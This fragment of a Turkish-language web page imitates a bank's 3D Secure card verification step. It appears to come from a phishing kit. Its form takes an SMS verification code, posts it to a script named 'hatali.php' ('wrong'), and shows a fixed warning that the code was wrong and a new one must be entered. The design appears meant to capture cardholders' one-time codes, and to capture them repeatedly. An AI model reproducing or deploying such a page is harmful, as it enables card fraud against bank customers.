        ...
        <div class="content">
          ...
          <div class="action-wrapper" 3dsdisplay="prompt" 3dslabel="prompt">
            ...
            <div class="form-wrapper">
              ...
              <form 3dsaction="manual" id="bkmform" class="form-code" method="POST" action="hatali.php" autocomplete="off" novalidate="novalidate">
                <div class="form-row">
					<label for="code" class="otpcode">Doğrulama Kodu</label>
                  <input 3dsinput="password" type="text" class="f-input" oninput="maxLengthCheck(this)" onkeypress="return isNumeric(event)" name="sms31" id="passwordfield" maxlength="8" min="0" max="99999999" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
                </div>
 <p style="color:red;">YANLIŞ KOD GİRDİNİZ LÜTFEN YENİ GÖNDERİLEN KODU GİRİNİZ.</p>
